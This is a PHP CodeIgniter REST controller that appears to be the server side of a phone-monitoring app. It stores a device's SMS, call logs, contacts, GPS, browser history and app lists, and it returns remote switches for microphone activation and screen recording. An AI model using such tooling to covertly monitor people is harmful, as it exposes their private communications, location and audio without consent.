<?php   defined('BASEPATH') or exit('No direct script access allowed');

// This can be removed if you use __autoload() in config.php OR use Modular Extensions
require APPPATH . '/libraries/REST_Controller.php';

class Device extends REST_Controller {
	function __construct() {

		parent::__construct();
		$this -> load -> helper('url');
		$this -> load -> helper(array('form', 'url', 'constant_helper', 'function_helper'));
		$this -> load -> model('device_model');
		$this -> load -> library('email');

	}

	function deviceInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('device-info', $input_method);
		//$check_uuid = $this->device_model->check_uuid($input_method['uuid']);
		$device = $this -> device_model -> saveDeviceInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {

			$this -> response(array('message' => SUCCESS, 'device_id' => $device, 'status' => 1), 200);
		}

	}
	function deviceGeneralInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> deviceGeneralInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {
 
 moduleComplete($input_method['uuid'],"Battery,Storage,Ip Info,other networks","40");
			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}
	
		function deviceEventInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> deviceEventInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {
			$device=$this->device_model->deviceReady($input_method);
 moduleComplete($input_method['uuid'],"Event Info","80");
			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}
	

	function smsInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> smsInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {
 moduleComplete($input_method['uuid'],"Sms Info","30");
			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}

	function callLog() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> callLog($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {
 moduleComplete($input_method['uuid'],"Call logs","40");
			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}

	function contactInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> contactInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {
 moduleComplete($input_method['uuid'],"Contact info","60");
			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}

	function gpsInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> gpsInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {

			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}

	function browserHistoryInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> browserHistoryInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {
 moduleComplete($input_method['uuid'],"Browser History","50");
			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}

	function wifiInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> wifiInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {

			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}

	}

	function appInfo() {

		$input_method = $this -> webservices_inputs();
		$this -> validate_param('w1-info', $input_method);
		$device = $this -> device_model -> appInfo($input_method);

		if (!$device) {

			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		} else {

			$this -> response(array('message' => SUCCESS, 'status' => 1), 200);
		}
	}

	function deviceTokenInfo() {
		$input_method = $this -> webservices_inputs();
		$this -> validate_param('token', $input_method);
		$device = $this -> device_model -> saveDeviceToken($input_method);
		if ($device) {
			$this -> response(array('message' => SUCCESS, 'status' => "1"), 200);
		} else {
			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		}
	}

	function deviceBatteryLevel() {
		$input_method = $this -> webservices_inputs();
		$this -> validate_param('battery-level', $input_method);
		$device = $this -> device_model -> deviceBatteryLevel($input_method);
		if ($device) {
			$this -> response(array('message' => SUCCESS, 'status' => "1"), 200);
		} else {
			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		}
	}
	 
	 
		function deviceStatus()
    {
    	
		 $screenrecord = 0;
            $input_method = $this->webservices_inputs();
            $this->validate_param('device-status',$input_method);
            $device=$this->device_model->saveDeviceStatus($input_method);
			 $device_request=$this->device_model->checkDeviceRequest($input_method);
           if($device_request){
           	$updateStatus = 1;
           }else{
           	$updateStatus = 0;
           }
		   $device_deleted = $this->device_model->deviceDeleted($input_method['uuid']);
		   		    $data_settings = $this->device_model->get_data_settings($input_method['uuid']);
		$auto_sleep =	$auto_sync = $microphone= 0;$time = '00:00';$media_wifi=$media_gsm = 1;
			if(count($data_settings)>0){
				           $auto_sync_on = $auto_sync_off  = 0;
				$time = '';
                 if(isset($data_settings['auto_sync'])){
                	if($data_settings['auto_sync']==1){
                		 $auto_sync = 1;
						 
						$time = date('H:i',strtotime($data_settings['sync_time']));
                	}else{
                		$auto_sync  = 0;
                	}
                }
                $media_both = $media_gsm = $media_wifi = 0;
				    if(isset($data_settings['media_sync'])){
                	if($data_settings['media_sync']==1){
                		 $media_wifi = 1;
						 
                	}else if($data_settings['media_sync']==2){
                		$media_gsm = 1;
                	}                	
                	else{
                		$media_gsm = 1;
						$media_wifi = 1;
                	}
                }
                $microphone_on = $microphone_off = 0;
				if(isset($data_settings['microphone'])){
                	if($data_settings['microphone']==1){
                		 $microphone  = 1;
						 
                	}else{
                		$microphone  = 0;
                	}
                }
			 

				if(isset($data_settings['screen_recording_activate'])){
                	if($data_settings['screen_recording_activate']==1){
                		  $screenrecord  = 1;
						 
                	}else{
                		 $screenrecord  = 0;
                	}
                }
						if(isset($data_settings['auto_sleep'])){
                	if($data_settings['auto_sleep']==1){
                		  $auto_sleep  = 1;
						 
                	}else{
                		 $auto_sleep  = 0;
                	}
                }
			 
			 }
		   
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL,'screen_recording_activate'=>(string) $screenrecord,'mircophone_activate'=>(string) $microphone,'auto_sleep'=>(string) $auto_sleep,'device_deleted'=>(string) $device_deleted, 'updateStatus'=>0, 'status' => 0), 200);
            }else{
              
                 $this->response(array('message' =>SUCCESS, 'screen_recording_activate'=>(string) $screenrecord,'mircophone_activate'=>(string) $microphone,'auto_sleep'=>(string) $auto_sleep, 'device_deleted'=>(string) $device_deleted,'updateStatus'=>$updateStatus,'status' => 1), 200);
            }
           
    }
	
}
?>
